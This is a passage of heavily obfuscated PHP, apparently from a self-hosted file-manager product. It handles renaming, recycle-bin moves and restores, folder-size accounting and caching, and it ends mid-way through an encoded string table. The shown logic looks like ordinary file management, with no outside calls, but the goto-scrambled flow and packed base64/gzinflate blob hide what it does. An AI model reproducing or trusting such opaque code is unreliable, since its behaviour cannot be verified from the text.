0) { if (!_get($GLOBALS, $A捋[474])) { return !1; } } goto Bۋ; Bۋ: $this->lockMoveStart($e͟); Hook::trigger($A捋[1936], $BϚĲ, $A󭓆); if ($A󭓆) { Model($A捋[1934])->moveToRecycle($e͟); } else { $C̐ = $this->childrenAll($E⸰); Model($A捋[522])->eventRemove($e͟); $this->removeRelevance($C̐[$A捋[1933]], $C̐[$A捋[1313]]); } goto fە; fە: $this->folderSizeReset($E⸰[$A捋[478]]); $cཌ = array($E⸰[$A捋[478]]); if ($E⸰[$A捋[386]] == $A捋[83]) { $cཌ[] = $E⸰[$A捋[385]]; } goto bߡč; a«к: return !0; goto f۫; f۫: } public function childrenAll($a҆벉) { $D䞽 =& $_SERVER[Ť]; $DĦϩ = $a҆벉[$D䞽[385]]; if ($a҆벉[$D䞽[386]] == $D䞽[83]) { $Bஂѫ = array($D䞽[542] => array($D䞽[500], $a҆벉[$D䞽[476]] . $DĦϩ . $D䞽[501])); $E߃ = array($D䞽[542] => $Bஂѫ[$D䞽[476]]); $F = $this->field($D䞽[1937])->where($E߃)->select(); $e솗 = !1; $F = array($DĦϩ); if ($F) { $e솗 = array_to_keyvalue($F, $D䞽[33], $D䞽[435]); $e솗 = array_remove_value($e솗, $D䞽[485]); $F = array_to_keyvalue($F, $D䞽[33], $D䞽[385]); $F[] = $DĦϩ; } } else { $e솗 = array($a҆벉[$D䞽[435]]); $F = array($DĦϩ); } return array($D䞽[1933] => $F, $D䞽[1313] => $e솗); } public function removeArray($Cܓ) { if (!$Cܓ) { return !0; } } public function removeRelevance($eǝُ, $b) { goto bǇ; Dҫĉ: Model($Dĺ[1915])->removeBySource($eǝُ); $this->where($D䶗)->delete(); Model($Dĺ[438])->remove($b); goto Fš; bǇ: $Dĺ =& $_SERVER[Ť]; $eǝُ = $eǝُ ? $eǝُ : array(); $b = $b ? $b : array(); goto E΍; cߺ: $D䶗 = array($Dĺ[399] => array($Dĺ[400], $eǝُ)); Model($Dĺ[1934])->where($D䶗)->delete(); Model($Dĺ[429])->where($D䶗)->delete(); goto Cк; Fš: for ($d՚ = 0; $d՚ < count($eǝُ); $d՚++) { $this->sourceCacheClear($eǝُ[$d՚]); } goto Dҿ; Cк: Model($Dĺ[1786])->where($D䶗)->delete(); Model($Dĺ[522])->where($D䶗)->delete(); Model($Dĺ[1629])->removeBySource($eǝُ); goto Dҫĉ; E΍: $eǝُ = array_unique(array_filter($eǝُ)); $b = array_unique(array_filter($b)); if (!$eǝُ) { return !1; } goto cߺ; Dҿ: } public function rename($aѠ, $a݇ܐ) { goto cܰ; Dބ: if (!$d[$A¤Ƥ[386]] == $A¤Ƥ[83]) { $dޙ[$A¤Ƥ[388]] = get_path_ext($a݇ܐ); } Model($A¤Ƥ[522])->eventRename($aѠ, $d[$A¤Ƥ[28]], $a݇ܐ); $this->sourceCacheClear($aѠ); goto B; B: $this->setNamePinyin($aѠ, $dޙ[$A¤Ƥ[28]], !1); $this->updateModifyTime($d[$A¤Ƥ[478]]); $a = $this->where(array($A¤Ƥ[399] => $aѠ))->data($dޙ)->save(); goto BӾ; Aڥ: $F = $this->fileNameExist($d[$A¤Ƥ[478]], $a݇ܐ); if ($F && $F != $aѠ) { return !1; } $dޙ = array($A¤Ƥ[402] => $a݇ܐ, $A¤Ƥ[541] => USER_ID); goto Dބ; BӾ: $f = $A¤Ƥ[1923] . $d[$A¤Ƥ[478]]; if (isset(self::$cacheChildList[$f])) { unset(self::$cacheChildList[$f]); } return $a; goto E; cܰ: $A¤Ƥ =& $_SERVER[Ť]; $d = $this->sourceInfo($aѠ); if (!$d) { return !1; } goto Aڥ; E: } public function setNamePinyin($e½ʽ, $e, $aƲӏ = true) { $c؞֐ =& $_SERVER[Ť]; $C׾ = Input::check($e, $c؞֐[545]); if ($aƲӏ && !$C׾) { return; } if (!$C׾) { $this->metaSet($e½ʽ, $c؞֐[432], null); $this->metaSet($e½ʽ, $c؞֐[431], null); return; } $f͐ = array($c؞֐[432] => str_replace($c؞֐[50], $c؞֐[33], Pinyin::encode($e)), $c؞֐[431] => Pinyin::encode($e, $c؞֐[546])); $this->metaSet($e½ʽ, $f͐); } public function getContent($dǹ) { goto E揽; E揽: $aÇ =& $_SERVER[Ť]; $Eй = $this->fileInfoGet($dǹ); if (!$Eй) { return !1; } goto Fਸ਼; Fਸ਼: if ($Eй[$aÇ[77]] == 0) { return $aÇ[33]; } $aꊿ = $aÇ[1938] . $Eй[$aÇ[167]]; if ($Eй[$aÇ[77]] <= 1024 * 10) { $c = Cache::get($aꊿ); if (!$c) { $c = IO::getContent($Eй[$aÇ[75]]); Cache::set($aꊿ, $c); } return $c; } goto c; c: if (!$Eй[$aÇ[75]]) { return $aÇ[33]; } return IO::getContent($Eй[$aÇ[75]]); goto dΩ; dΩ: } public function setDesc($D߻, $f) { $cɔҜ =& $_SERVER[Ť]; Model($cɔҜ[522])->eventAddDesc($D߻, $f); return $this->metaSet($D߻, $cɔҜ[421], $f); } public function setContent($Eͧߜ, $Dۯ = '') { goto Dˇ; Dˇ: $B =& $_SERVER[Ť]; $Eʖױ = $this->sourceInfo($Eͧߜ); $F = $this->fileInfoGet($Eͧߜ); goto c; c: if (!$F || !$Eʖױ) { return !1; } $Fᴊ = Model($B[438])->addFileByContent($Dۯ, $Eʖױ[$B[28]]); $E = $this->fileHistory($Eʖױ, $Fᴊ[$B[435]], $Fᴊ[$B[77]]); goto a; a: if (!$E) { return Model($B[438])->remove($Fᴊ[$B[435]]); } $this->folderSizeReset($Eʖױ[$B[478]]); return !0; goto F̯; F̯: } public function fileSubstr($Fٽ, $a, $FŇ) { $c⛲ = $this->fileInfoGet($Fٽ); if (!$c⛲) { return !1; } return IO::fileSubstr($c⛲[$_SERVER[Ť][75]], $a, $FŇ); } public function fileInfoGet($AԺ) { goto e֣ڎ; Aˆ: $c቎ = $D뒪[441] . $Bͱ[$D뒪[435]]; $F򏻳 = _get(self::$cacheFileInfo, $c቎); if ($F򏻳) { return $F򏻳; } goto D; e֣ڎ: $D뒪 =& $_SERVER[Ť]; $Bͱ = $this->sourceInfo($AԺ); if (!$Bͱ || $Bͱ[$D뒪[386]]) { return !1; } goto Aˆ; dઋ: return $dΕ; goto Bʌ; D: $dΕ = Model($D뒪[438])->fileInfo($Bͱ[$D뒪[435]]); if ($dΕ) { $dΕ[$D뒪[28]] = $Bͱ[$D뒪[28]]; } self::$cacheFileInfo[$c቎] = $dΕ; goto dઋ; Bʌ: } private function folderChildrenNumber($a葌) { $d񪾐 =& $_SERVER[Ť]; $E = $this->sourceInfo($a葌); $c = array($d񪾐[542] => array($d񪾐[500], $E[$d񪾐[476]] . $a葌 . $d񪾐[501]), $d񪾐[412] => intval($E[$d񪾐[413]]), $d񪾐[535] => 1); $fݎ = $this->where($c)->count(); $A҆ = $this->where($c)->where(array($d񪾐[535] => 0))->count(); return array($d񪾐[81] => $A҆, $d񪾐[82] => $fݎ); } public function pathInfo($AȟǓ, $fމ = false) { goto A򿂈; F߻Ě: $D = $this->sourceInfo($AȟǓ); if (!$D) { return !1; } $D = $this->_listDataApplyItem($D, $fމ); goto CΎҌ; CΎҌ: self::$cachePathInfo[$d] = $D; return $D; goto d˯; A: $d = $AҼɞ[427] . intval($fމ) . $AҼɞ[428] . $AȟǓ; $bξ = _get(self::$cachePathInfo, $d); if ($bξ) { return $bξ; } goto F߻Ě; A򿂈: $AҼɞ =& $_SERVER[Ť]; $fމ = !1; $AȟǓ = intval($AȟǓ); goto A; d˯: } public static $cachePathInfoMore = array(); public function pathInfoMore($Aݻ) { goto dމ; cЂ: $Aɠć = $this->pathInfo($Aݻ); if (!$Aɠć) { return !1; } if ($Aɠć[$dՂ̏[386]] == $dՂ̏[83]) { $Aɠć[$dՂ̏[80]] = $this->folderChildrenNumber($Aݻ); } goto b; b: self::$cachePathInfoMore[$Aݻ] = $Aɠć; return $Aɠć; goto aț; dމ: $dՂ̏ =& $_SERVER[Ť]; $F䉐ʉ = _get(self::$cachePathInfoMore, $Aݻ); if ($F䉐ʉ) { return $F䉐ʉ; } goto cЂ; aț: } public function sourceInfo($e) { goto d; D: $d娈 = $this->where(array($Bۛݔ[385] => $e))->find(); self::$cacheSourceInfo[$Aё] = $d娈; return self::$cacheSourceInfo[$Aё]; goto bԲ; d: $Bۛݔ =& $_SERVER[Ť]; if (!$e) { return array(); } $e = intval($e); goto f˹; f˹: $Aё = $Bۛݔ[426] . $e; $d = _get(self::$cacheSourceInfo, $Aё); if ($d) { return $d; } goto D; bԲ: } public function sourceCacheClear($a˱ = false) { self::cacheClear($a˱); } public static function cacheClear($c◧ά = false) { $dҠ =& $_SERVER[Ť]; if ($c◧ά == !1) { goto Bٖ; Bٖ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto d; d: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto cԐ☸; cԐ☸: return; goto A謿; A謿: } unset(self::$cacheSourceInfo[$dҠ[426] . $c◧ά]); unset(self::$cachePathInfoMore[$c◧ά]); unset(self::$cachePathInfo[$dҠ[1939] . $c◧ά]); unset(self::$cachePathInfo[$dҠ[1940] . $c◧ά]); } public function metaSet($Dո, $aߵ = null, $a = null) { $C = parent::metaSet($Dո, $aߵ, $a); if ($C) { $this->sourceCacheClear($Dո); } return $C; } public function pathInfoByPath($Aժ, $d݇) { $C󱿊 =& $_SERVER[Ť]; $c񦄱 = !$d݇ ? array() : explode($C󱿊[8], trim($d݇, $C󱿊[8])); $bⅭ = $Aժ; foreach ($c񦄱 as $E邯) { $Dڶ✧ = array($C󱿊[478] => $bⅭ, $C󱿊[28] => $E邯); $AϾ = $this->where($Dڶ✧)->select(); if (!$AϾ) { return !1; } $AϾ = array_sort_by($AϾ, $C󱿊[413]); $bⅭ = $AϾ[0][$C󱿊[385]]; } return $this->pathInfo($bⅭ, !0); } protected function updateModifyTime($bÛ) { goto dΪ; f߿: $this->where($aҦ)->save($EĮ); goto ä́; dΪ: $Eäԩ =& $_SERVER[Ť]; if (!$bÛ) { return; } if (!is_array($bÛ)) { $bÛ = array($bÛ); } goto Cɥ; Cɥ: foreach ($bÛ as $c => $d) { $bÛ[$c] = intval($d); $this->sourceCacheClear($d); } $aҦ = array($Eäԩ[385] => array($Eäԩ[7], $bÛ)); $EĮ = array($Eäԩ[541] => USER_ID, $Eäԩ[406] => time()); goto f߿; ä́: } public function folderSizeReset($CȞ, $e = false) { goto C٭̉; C٭̉: $B =& $_SERVER[Ť]; if ($this->statusIgnoreResetSpace) { return; } $d풯 = $this->sourceInfo($CȞ); goto fɊ; d: $DĪ[] = $d풯[$B[385]]; $aړ = array($B[385] => array($B[400], $DĪ)); if ($e < 0) { $aړ[$B[77]] = array($B[943], abs($e)); } goto B; fɊ: $AɼԻ = $B[1941] . $CȞ; CacheLock::lock($AɼԻ, 20); if ($e === !1) { $this->sourceCacheClear($CȞ); $d풯 = $this->sourceInfo($CȞ); $aړ = array($B[384] => $CȞ, $B[412] => 0); $dܷ = $this->where($aړ)->sum($B[77]); $e = intval($dܷ) - intval($d풯[$B[77]]); } goto f; f: if ($e == 0) { return CacheLock::unlock($AɼԻ); } $DĪ = $this->parentLevelArray($d풯[$B[476]]); if (!$DĪ) { $DĪ = array(); } goto d; B: $this->where($aړ)->setAdd($B[77], $e); CacheLock::unlock($AɼԻ); $this->targetSpaceUpdate($d풯[$B[387]], $d풯[$B[473]]); goto A; A: } public function folderSizeResetChildren($D҅Α) { goto e¢; B: foreach ($Dۅ as $F) { if ($F[$aӓ[77]] == $F[$aӓ[1943]]) { continue; } $FϹ[] = array($aӓ[385], $F[$aӓ[385]], $aӓ[77], $F[$aӓ[77]]); } $this->saveAll($FϹ); goto C♘; e¢: $aӓ =& $_SERVER[Ť]; $this->sourceCacheClear($D҅Α); $C׎ = $this->sourceInfo($D҅Α); goto B; f߃: $d[$aӓ[386]] = 0; $f = $this->field($b)->where($d)->select(); if (!$f) { return; } goto EՆݡ; EՆݡ: $Dۅ[] = $C׎; $Dۅ = array_to_keyvalue($Dۅ, $aӓ[385]); foreach ($Dۅ as $eҳ => $F) { $Dۅ[$eҳ][$aӓ[1943]] = $Dۅ[$eҳ][$aӓ[77]]; $Dۅ[$eҳ][$aӓ[77]] = 0; } goto C݈; B: $d = array($aӓ[535] => 1, $aӓ[542] => array($aӓ[500], $C׎[$aӓ[476]] . $D҅Α . $aӓ[501])); $b = $aӓ[1942]; $Dۅ = $this->field($b)->where($d)->select(); goto f߃; C݈: foreach ($f as $F) { $B뒗 = $F[$aӓ[478]] . $aӓ[33]; if (!isset($Dۅ[$B뒗])) { continue; } if ($F[$aӓ[413]] == $Dۅ[$B뒗][$aӓ[413]]) { $Dۅ[$B뒗][$aӓ[77]] += $F[$aӓ[77]]; } } foreach ($Dۅ as $F) { $aІ؇ = $this->parentLevelArray($F[$aӓ[476]]); foreach ($aІ؇ as $B뒗) { $B뒗 = $B뒗 . $aӓ[33]; if (!isset($Dۅ[$B뒗])) { continue; } if ($F[$aӓ[413]] == $Dۅ[$B뒗][$aӓ[413]]) { $Dۅ[$B뒗][$aӓ[77]] += $F[$aӓ[77]]; } } } $FϹ = array(); goto B; C♘: } public function userSpaceReset($Cꦧ = false) { $c񯣻 =& $_SERVER[Ť]; $E֥ = $this->where(array($c񯣻[387] => self::TYPE_USER, $c񯣻[473] => $Cꦧ, $c񯣻[386] => 0))->sum($c񯣻[77]); Model($c񯣻[491])->userEdit($Cꦧ, array($c񯣻[1638] => $E֥)); } public function targetSpaceUpdate($a, $FӇ넂) { $B =& $_SERVER[Ť]; if (!$FӇ넂) { return; } if (!in_array($a, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $bʉ = $this->targetSpaceSize($a, $FӇ넂); if ($a == self::TYPE_USER) { Model($B[491])->userEdit($FӇ넂, array($B[1638] => $bʉ)); } else { if ($a == self::TYPE_GROUP) { Model($B[475])->groupEdit($FӇ넂, array($B[1638] => $bʉ)); } } } public function targetSpaceSize($e錢, $E) { goto fμ쒑; BƜ: $e潮Ĝ = array_to_keyvalue($e潮Ĝ, $D[33], $D[385]); $e潮Ĝ = array_unique(array_filter($e潮Ĝ)); if ($e潮Ĝ) { $eΑ = array($D[399] => array($D[400], $e潮Ĝ)); $aݭ += floatval($this->where($eΑ)->sum($D[77])); } goto b; b: return $aݭ; goto e猬; fμ쒑: $D =& $_SERVER[Ť]; $CĮÇ = $this->sourceRoot($e錢, $E, !0); if (!$CĮÇ) { return 0; } goto aװ; aװ: $aݭ = floatval($CĮÇ[$D[77]]); $eΑ = array($D[542] => array($D[500], $D[487] . $CĮÇ[$D[385]] . $D[501])); $e潮Ĝ = Model($D[411])->field($D[399])->where($eΑ)->select(); goto BƜ; e猬: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($b̊ȃ) { return $this->fileTypeProfile($b̊ȃ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Fק̏) { return $this->fileTypeProfile($Fק̏, SourceModel::TYPE_GROUP); } private function fileTypeProfile($E, $cտ߉) { goto Bݬ; AǾ܎: $bűޤ = array(); $bűޤ[$cƟ[1945]] = array($cƟ[1946] => LNG($cƟ[1945]), $cƟ[1947] => $this->where($cݱ)->count(), $cƟ[537] => $this->where($cݱ)->sum($cƟ[77])); $B̻ = KodIO::fileTypeList(); goto dЙ; e: if ($B򓷩) { return $B򓷩; } $cݱ = array($cƟ[535] => 0); if ($E != !1) { $cݱ[$cƟ[473]] = $E; $cݱ[$cƟ[387]] = $cտ߉; } goto AǾ܎; Bݬ: $cƟ =& $_SERVER[Ť]; $b󛫭 = $cƟ[1944] . $E . $cƟ[70] . $cտ߉; $B򓷩 = Cache::get($b󛫭); goto e; dЙ: foreach ($B̻ as $fՔ => $eў) { $cݱ[$cƟ[388]] = $this->fileTypeWhere($fՔ); $bűޤ[$fՔ] = array($cƟ[1946] => $eў[$cƟ[28]], $cƟ[1947] => $this->where($cݱ)->count(), $cƟ[537] => $this->where($cݱ)->sum($cƟ[77])); } Cache::set($b󛫭, $bűޤ, 1200); return $bűޤ; goto B; B: } public function fileNameExist($A, $Eʉ) { $fϬ =& $_SERVER[Ť]; $C = $this->childList($A); foreach ($C as $Bن) { if ($Bن[$fϬ[28]] == $Eʉ) { return $Bن[$fϬ[385]]; } if (strtolower($Bن[$fϬ[28]]) == strtolower($Eʉ)) { return $Bن[$fϬ[385]]; } } return !1; } public function childList($dĢ) { goto bʳ; bʳ: $fܢ =& $_SERVER[Ť]; $E = $fܢ[1923] . $dĢ; if (isset(self::$cacheChildList[$E])) { return self::$cacheChildList[$E]; } goto a; f: self::$cacheChildList[$E] = $Aʋ; foreach ($Aʋ as $f) { $E = $fܢ[426] . $f[$fܢ[385]]; self::$cacheSourceInfo[$E] = $f; } return $Aʋ; goto E; a: $c = array($fܢ[478] => intval($dĢ), $fܢ[413] => 0); $Aʋ = $this->where($c)->select(); $Aʋ = $Aʋ ? $Aʋ : array(); goto f; E: } public function fileNameAuto($a¹, $cъ֋֌, $C׌両 = REPEAT_RENAME, $b̲ս = false) { $aǰ =& $_SERVER[Ť]; $aｨ = $this->childList($a¹); $Aù = array_to_keyvalue($aｨ, $aǰ[33], $aǰ[28]); return $this->fileNameAutoGet($Aù, $cъ֋֌, $C׌両, $b̲ս); } public function fileNameAutoGet($F, $dͫƘ, $Bܗɪ˕, $F鍲) { $C㬓 =& $_SERVER[Ť]; if ($Bܗɪ˕ == REPEAT_REPLACE || !$F || !in_array_not_case($dͫƘ, $F) || $F鍲 && $Bܗɪ˕ != REPEAT_RENAME_FOLDER) { return $dͫƘ; } if ($Bܗɪ˕ == REPEAT_SKIP) { return !1; } $c̝Ҥ = $C㬓[91] . get_path_ext($dͫƘ); $c̝Ҥ = $c̝Ҥ == $C㬓[91] || $F鍲 ? $C㬓[33] : $c̝Ҥ; for ($dѪŊ = 1; $dѪŊ <= count($F) + 1; $dѪŊ++) { $dƎ = substr($dͫƘ, 0, strlen($dͫƘ) - strlen($c̝Ҥ)); $a䳕 = $dƎ . "\50{$dѪŊ}\x29{$c̝Ҥ}"; if (!in_array_not_case($a䳕, $F)) { return $a䳕; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\162\x63\x65\x5f\x72\x65\x63\x79\x63\154\145"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\x54\x69\x6d\x65", "\164\x69\155\x65", "\151\156\163\x65\162\x74", "\x66\165\156\143\164\151\x6f\156")); public function listData($d嶑 = false) { $c묺 =& $_SERVER[Ť]; $d嶑 = $d嶑 ? $d嶑 : USER_ID; $cѰ = $this->where(array($c묺[1485] => $d嶑))->select(); return array_to_keyvalue($cѰ, $c묺[33], $c묺[385]); } public function moveToRecycle($Bƣ) { goto d; F: if (!$CՉ || $CՉ[$DЖ[413]] == $DЖ[83]) { return; } $eČ = array($DЖ[399] => $Bƣ, $DЖ[1485] => USER_ID, $DЖ[538] => $CՉ[$DЖ[387]], $DЖ[539] => $CՉ[$DЖ[473]], $DЖ[542] => $CՉ[$DЖ[476]]); $this->add($eČ); goto a; a: $this->recycleMove($Bƣ, 1); if ($CՉ[$DЖ[386]] == $DЖ[83]) { $a = array($DЖ[542] => array($DЖ[500], $CՉ[$DЖ[476]] . $Bƣ . $DЖ[501])); $Cʤ->where($a)->setField($DЖ[413], 1); } goto AҖ; d: $DЖ =& $_SERVER[Ť]; $Cʤ = Model($DЖ[1172]); $CՉ = $Cʤ->sourceInfo($Bƣ); goto F; AҖ: } public function clear() { $this->remove(!1); } public function remove($b = false) { goto D茪; b: foreach ($Aޕ as $B٨±) { $b->targetSpaceUpdate($B٨±[$Aᐬ[387]], $B٨±[$Aᐬ[473]]); } goto A; Dȯ: $b = $b === !1 ? !1 : $b; $Aޕ = array(); foreach ($e· as $B촍) { if ($b != !1 && !in_array($B촍, $b)) { continue; } $Aߔ = $b->sourceInfo($B촍); $b->remove($B촍, !1); $Cֽ = $Aߔ[$Aᐬ[387]] . $Aᐬ[70] . $Aߔ[$Aᐬ[473]]; $Aޕ[$Cֽ] = array($Aᐬ[538] => $Aߔ[$Aᐬ[387]], $Aᐬ[473] => $Aߔ[$Aᐬ[473]]); $this->where(array($Aᐬ[385] => $B촍))->delete(); } goto b; D茪: $Aᐬ =& $_SERVER[Ť]; $b = Model($Aᐬ[1172]); $e· = $this->listData(); goto Dȯ; A: } public function restore($bҚ曐 = false) { goto D; D: $A¨ =& $_SERVER[Ť]; $A¬ = Model($A¨[1172]); $d㬝 = $this->listData(); goto C; aݗُ: foreach ($d㬝 as $c榍̑) { goto c򮈍; c򮈍: if ($bҚ曐 != !1 && !in_array($c榍̑, $bҚ曐)) { continue; } $D = $A¬->sourceInfo($c榍̑); $F͢ = $A¬->sourceInfo($D[$A¨[478]]); goto D͕; D͕: if ($F͢[$A¨[413]] == $A¨[83]) { continue; } $A¬->lockMoveStart($c榍̑); $this->recycleMove($c榍̑, 0); goto F; bϚ: $Fｌ[] = $D[$A¨[478]]; if ($D[$A¨[386]] == $A¨[83]) { $Fｌ[] = $c榍̑; } $A¬->lockMoveEnd($c榍̑); goto e䗔쟠; F: if ($D[$A¨[386]] == $A¨[83]) { $f = array($A¨[542] => array($A¨[500], $D[$A¨[476]] . $c榍̑ . $A¨[501])); $A¬->where($f)->setField($A¨[413], 0); $this->restoreFolderChildren($c榍̑, $d㬝); } $this->where(array($A¨[385] => $c榍̑))->delete(); $A¬->folderSizeReset($D[$A¨[478]]); goto bϚ; e䗔쟠: } $A¬->updateModifyTime($Fｌ); goto AՌ; C: $bҚ曐 = $bҚ曐 == !1 ? !1 : $bҚ曐; if (!$d㬝) { return !0; } $Fｌ = array(); goto aݗُ; AՌ: } private function restoreFolderChildren($c, $D) { goto DƸǻ; F: $e[$dЅ̏[385]][1] = array_unique($e[$dЅ̏[385]][1]); $e[$dЅ̏[928]] = $dЅ̏[1741]; $bЎ->where($e)->setField($dЅ̏[413], 1); goto D׈; DƸǻ: $dЅ̏ =& $_SERVER[Ť]; $bЎ = Model($dЅ̏[1172]); $e = array($dЅ̏[385] => array($dЅ̏[7], array())); goto C݇; C݇: foreach ($D as $D挄) { if ($D挄 == $c) { continue; } if (!$bЎ->isParentOf($c, $D挄)) { continue; } $e۾ݜ = $bЎ->sourceInfo($D挄); if ($e۾ݜ[$dЅ̏[386]] == $dЅ̏[83]) { $e[] = array($dЅ̏[542] => array($dЅ̏[500], $e۾ݜ[$dЅ̏[476]] . $D挄 . $dЅ̏[501])); } else { $e[$dЅ̏[385]][1][] = $D挄; } } if (!$e[$dЅ̏[385]][1]) { unset($e[$dЅ̏[385]]); } if (!$e) { return; } goto F; D׈: } private function recycleMove($B˽, $f = 1) { $cᖗ =& $_SERVER[Ť]; $aԊׇ = Model($cᖗ[1172]); $d΄ = Model($cᖗ[1948]); $Fص׬ = array($cᖗ[385] => $B˽); if ($f) { $aԊׇ->where($Fص׬)->setField($cᖗ[413], 1); $d΄->eventRecycle($B˽, $cᖗ[1949]); } else { $fثﻉ = $aԊׇ->where($Fص׬)->find(); $cΨֱ = $fثﻉ[$cᖗ[386]] == $cᖗ[83]; $Cעҝ = $aԊׇ->fileNameAuto($fثﻉ[$cᖗ[478]], $fثﻉ[$cᖗ[28]], REPEAT_RENAME_FOLDER, $cΨֱ); if ($Cעҝ != $fثﻉ[$cᖗ[28]]) { $aԊׇ->rename($B˽, $Cעҝ); } $aԊׇ->where($Fص׬)->setField($cᖗ[413], 0); $d΄->eventRecycle($B˽, $cᖗ[1950]); } } } goto Eɐ; f: define($_SERVER[Ť][0], $_SERVER[Ť][1]); $_SERVER[] = explode($_SERVER[Ť][2], gzinflate(substr($_SERVER[Ť][3], 10, -8))); function binCheckEq($c۠, $F҃ꃌ) { return $c۠ == $F҃ꃌ; } goto aǓ; fआ: if (!function_exists('_kodDe')) { function _kodDe($c) { $c = base64_decode($c); $Bղ = strlen($c); $d = ''; $aȊ = ord($c[0]) - 30; for ($bچ = 1; $bچ < $Bղ; $bچ += 2) { if ($bچ + 1 < $Bղ) { $d .= chr(ord($c[$bچ + 1]) + $aȊ); $d .= chr(ord($c[$bچ]) + $aȊ); } else { $d .= chr(ord($c[$bچ]) + $aȊ); } } return $d; } } define("\xc1\xde\xc5\xa4\xd2", strrev('')); $_SERVER[Ť] = explode(strrev('|||'), gzinflate(substr(base64_decode('H4sIAAAAAAAAA619CXxTVda4zqgjqOO+6/gsQlvI0payFUpN2xQiaVOTlLXl')."\361\222\274\44\217\46\171\151\336\113\67\300\145\104\101\20\134\100\147\120\161\304\175\101\4\167\160\337\105\205\121\307\5\307\35\5\24\107\161\31\20\306\355\273\373".base64_decode('ve8lON9/4afNvecu7y7nnnvOveece9nTK+YeNPd3c3+3bMcFq/Y+cefaVTg6')."\xf7\xc0\xb9\x7\xcf\x3d\x4\x87\xcf\x58\x7c\xe8\x1\xe8\xdf\xef\x17\x2f\x2a\x2b\x9b\x38\x72\xe0\xb0\x96\xc3\x2f\x7f\xe0\x1e\x65\xb5\x72\x8f\xb2\x38\xe0\x7f\xe5\x55\xdf\x11\x9b\x57"."\237\343\335\176\363\53\175\333\17\74\340\235\105\135\162\15\310\214\313\326\340\37\51\243\233\222\332\253\31\246\201\1\121\75\23\327\22\70\254\145\360\257\33\377\30"."\135\51\315\124\161\130\156\11\204\345\120\133\153\253\67\30\226\111\215\142\172\132\217\221\120\126\311\51\151\122\171\126\315\31\340\123\142\165\162\126\317\252\31\13\204".strrev('c*2(c5y]Ȉ䗫Zxri[z7/XԃDb')."\xaa\xf7\x4e\xf0\xb5\x48\xe1\xa0\xa7\x25\xe4\x69\x8\xfb\x2\x2d\x18\xdc\x10\x68\x6e\xf6\x85\xb\xe1\xc1\x80\xdf\x5f\xef\x69\x98\x54\x98\xd2\x1a\xf4\x4c\x68\xf6\x48\xa0\x7d\x29\x55".base64_decode('1jJxvUyahVNmSeU40KSpqRgOZhTaHLMvS0JhFgJzkMmnUjjSwkKk/WpcyafI')."\230\65\212\221\154\116\113\53\264\353\223\324\76\6\305\1\45\157\352\132\46\212\43\336\136\63\247\160\70\150\161\64\247\246\325\14\251\52\344\365\173\33\302\22\154"."\xa6\xd4\x14\xc\x34\x4b\x64\x2a\xd2\x8a\x61\xaa\x39\x69\xca\x44\x6f\xd0\x2b\xc1\xa6\xd7\x96\xa2\x1e\x97\x4a\xb8\x5c\x5b\xb\x18\x10\xc9\xe3\xf7\x4b\xfb\xab\xc1\x54\xd3\x59\x5a\xd"."\56\123\244\262\100\260\321\33\224\352\247\111\174\234\242\172\72\255\147\134\240\26\60\237\246\320\124\157\60\210\3\16\202\301\176\37\234\72\22\11\64\65\205\274\54"."\x46\x3a\x77\xae\x1f\xb4\x64\x38\xc1\x52\x4b\x2c\x16\x4f\x99\x72\xb7\x92\xca\x53\x64\xed\xc4\xbf\xa5\xe4\x87\xfc\xea\x6\x41\xe0\x2e\x2d\xa3\xe5\x9\xb2\x92\x2a\x74\x9d\xad\x1c\x12"."\310\323\334\52\205\244\101\61\235\254\51\260\300\272\161\260\166\74\376\35\113\62\105\144\230\246\346\114\131\315\104\365\230\226\41\313\260\216\54\71\202\170\212\231\154"."\314\151\40\37\251\120\167\105\365\154\137\263\336\115\372\20\327\122\252\237\255\262\270\236\212\251\71\36\317\202\342\142\12\351\214\326\57\224\156\311\247\305\54\54\32"."\x4d\x6a\xa9\x58\x8e\x2e\xce\xdf\xca\x59\x49\xaa\x55\x4d\x13\x74\xc3\xa0\x2d\x6d\xcb\xa6\x74\x25\x16\x52\x73\x42\xeb\x9b\x40\x35\x81\xbc\x29\x2\xf3\x28\x5b\x93\x9e\x4b\x37\x2\x2".strrev(':HJjJvPl1t.3e\\!L~"$VֽF@')."\x36\xc2\xa0\xad\x77\x1b\x11\x2d\xe3\x6\x10\x1c\xf5\x5\xe4\xa4\x62\x24\x9b\x63\x23\x64\x54\x8a\x12\xc7\x98\xda\xeb\xca\x26\xb3\x64\xd\xb3\x65\xdb\x6e\x41\x60\x38\xde\x2d\xba\xe9"."\x15\x48\x6c\x4a\x8f\x2a\x29\xb1\xa7\x38\x9c\x34\xcd\x6c\x48\xcd\xc4\xe0\x80\x90\x1e\xe9\x3d\x19\x34\x60\x59\x55\x25\x99\x1a\x1d\x52\x4c\x6a\x96\xa6\x49\x13\x6b\xb4\x1a\x8a\x5d\x0"."\127\342\175\234\342\45\315\164\212\205\150\157\31\314\140\100\263\227\340\104\11\211\253\275\46\31\44\151\154\64\251\344\300\364\325\346\315\270\163\64\41\34\331\154\112"."\213\52\246\246\147\334\172\324\124\115\247\141\346\124\205\324\346\211\106\125\303\160\66\350\31\63\247\247\234\236\124\112\357\161\6\162\132\102\313\324\110\103\11\231\5"."\211\140\41\73\41\351\253\41\253\263\144\254\4\61\11\256\374\241\370\153\164\325\261\334\71\45\143\304\325\234\323\113\226\105\215\4\346\207\121\76\232\255\121\63\262"."\272\241\301\346\325\110\212\151\52\321\44\244\32\274\372\332\337\310\257\145\122\132\106\55\310\353\355\315\152\71\325\240\155\225\46\64\207\111\45\240\166\325\331\232\123"."\22\151\245\106\312\346\43\140\144\310\372\54\2\303\271\311\320\324\110\121\30\165\110\351\274\141\72\163\52\40\77\32\330\350\310\344\371\342\316\146\70\237\232\32\163"."\206\0\225\46\340\341\25\325\22\100\43\211\246\141\350\304\160\270\125\366\65\201\315\270\305\53\67\173\302\15\23\111\263\115\45\101\333\354\7\264\227\125\111\201\123"."\235\140\311\101\104\153\1\175\345\300\126\275\107\315\201\17\327\367\325\110\235\172\54\242\367\272\150\22\314\34\2\124\202\146\206\323\235\65\235\101\45\223\200\343\23"."\xe9\x